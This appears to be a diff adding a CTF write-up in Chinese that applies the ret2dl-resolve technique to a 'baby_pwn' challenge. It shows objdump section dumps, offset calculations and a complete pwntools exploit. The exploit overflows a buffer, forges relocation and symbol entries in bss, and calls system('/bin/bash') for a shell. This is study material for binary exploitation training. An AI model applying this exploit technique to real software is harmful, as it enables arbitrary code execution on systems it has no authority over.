@@ -80,4 +80,88 @@ p.interactive()
  - `0x1e807`根据`((欲伪造的地址-.dynsym基地址)/0x10)<<8+7`,其中`dynsym`根据`objdump -s -j .dynsym ./x86`
  - `0x1e44`是`伪造地址-.dynstr基地址(objdump -s -j .dynstr ./x86)`
  
-最后在伪造地址填入`system`即完成操作
+最后在伪造地址填入`system`即完成操作,我们拿9102年国赛练习一下
+
+## baby_pwn
+
+```
+# pic @ pic-RESCUER-R720-15IKBN in ~/桌面/guosai [19:20:42] 
+$ objdump -s -j .rel.plt ./pwn
+
+./pwn：     文件格式 elf32-i386
+
+Contents of section .rel.plt:
+ 804833c 0ca00408 07010000 10a00408 07020000  ................
+ 804834c 14a00408 07040000 18a00408 07050000  ................
+```
+
+bss段地址为0x804A040,故第一处为0x1d04
+
+```
+# pic @ pic-RESCUER-R720-15IKBN in ~/桌面/guosai [19:20:46] 
+$ objdump -s -j .dynsym ./pwn
+
+./pwn：     文件格式 elf32-i386
+
+Contents of section .dynsym:
+ 80481dc 00000000 00000000 00000000 00000000  ................
+ 80481ec 20000000 00000000 00000000 12000000   ...............
+ 80481fc 33000000 00000000 00000000 12000000  3...............
+ 804820c 53000000 00000000 00000000 20000000  S........... ...
+ 804821c 41000000 00000000 00000000 12000000  A...............
+ 804822c 39000000 00000000 00000000 12000000  9...............
+ 804823c 25000000 64a00408 04000000 11001a00  %...d...........
+ 804824c 2c000000 40a00408 04000000 11001a00  ,...@...........
+ 804825c 0b000000 fc850408 04000000 11001000  ................
+ 804826c 1a000000 60a00408 04000000 11001a00  ....`...........
+```
+
+此处为  `((0x0804A040 + 4*4) - 0x80481dc) / 0x10 << 8 + 7 即 0x1e707`
+
+```
+# pic @ pic-RESCUER-R720-15IKBN in ~/桌面/guosai [19:21:26] C:1
+$ objdump -s -j .dynstr ./pwn
+
+./pwn：     文件格式 elf32-i386
+
+Contents of section .dynstr:
+ 804827c 006c6962 632e736f 2e36005f 494f5f73  .libc.so.6._IO_s
+ 804828c 7464696e 5f757365 64007374 64696e00  tdin_used.stdin.
+ 804829c 72656164 00737464 6f757400 73746465  read.stdout.stde
+ 80482ac 72720061 6c61726d 00736574 76627566  rr.alarm.setvbuf
+ 80482bc 005f5f6c 6962635f 73746172 745f6d61  .__libc_start_ma
+ 80482cc 696e005f 5f676d6f 6e5f7374 6172745f  in.__gmon_start_
+ 80482dc 5f00474c 4942435f 322e3000           _.GLIBC_2.0.    
+```
+
+此处为`(0x0804A040 + 8 + 24) - 0x804827c = 0x1ee4`
+
+我们来构造一下exp
+
+```
+from pwn import*
+p = process('./pwn')
+context.log_level = 'debug'
+elf = ELF('./pwn')
+gift = 0x0804A040#bss
+
+payload = 0x28*'a' + 4*'a'
+payload +=  p32(elf.plt['read']) + p32(0x804852D)#fun_addr
+payload += p32(0) + p32(gift) + p32(17*4)
+
+p.sendline(payload)
+
+payload = ''
+payload += p32(0x0804a00c) + p32(0x1e707)
+payload += p32(0)+p32(0x1ee4)
+payload += p32(0) *4
+payload += 'system\x00\x00'
+payload += '/bin/bash\x00'
+p.sendline(payload)
+
+payload = 0x28*'a' + 4*'a'
+payload += p32(0x8048380) + p32(0x1d04) + p32(0xbeef) + p32(gift + 10*4)# system + rubbish + 'sh'
+p.sendline(payload)
+
+p.interactive()
+```
